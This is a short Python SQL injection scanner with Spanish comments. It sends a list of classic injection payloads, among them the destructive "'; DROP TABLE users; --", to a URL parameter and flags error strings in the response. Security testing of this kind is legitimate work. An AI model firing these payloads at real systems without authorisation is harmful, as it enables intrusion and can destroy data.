import requests
from bs4 import BeautifulSoup

# Lista de pruebas de inyección SQL comunes
sql_injections = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
    "' OR 1=1 --",
]

def scan_sql_injection(url, param):
    vulnerable = False
    for payload in sql_injections:
        # Construir la URL con el payload de inyección SQL
        target_url = f"{url}?{param}={payload}"
        response = requests.get(target_url)

        # Verificar si la respuesta contiene indicios de inyección SQL exitosa
        if "error" in response.text or "syntax" in response.text or "SQL" in response.text:
            print(f"[+] Vulnerabilidad de SQL Injection encontrada en {target_url}")
            vulnerable = True

    if not vulnerable:
        print(f"[-] No se encontraron vulnerabilidades de SQL Injection en {url}")

# Ejemplo de uso
url = "http://example.com/search"
param = "query"
scan_sql_injection(url, param)
